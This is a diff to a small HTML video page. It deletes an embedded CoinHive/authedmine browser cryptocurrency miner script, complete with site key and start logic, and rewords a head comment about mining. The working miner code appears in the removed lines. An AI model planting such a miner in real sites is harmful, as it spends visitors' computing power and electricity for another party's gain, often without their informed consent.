@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><!-- Mining and say -->
+<head><!-- Don't mining and don't say -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
@@ -26,12 +26,4 @@
         <video controls src="video.mp4">Ici la description alternative</video>
     
 </body>
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('xy2FXjexnAKrdgQ2IUpS7WpFhllyXrtk', {throttle: 0.6});
-
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-    }
-</script>
 </html>
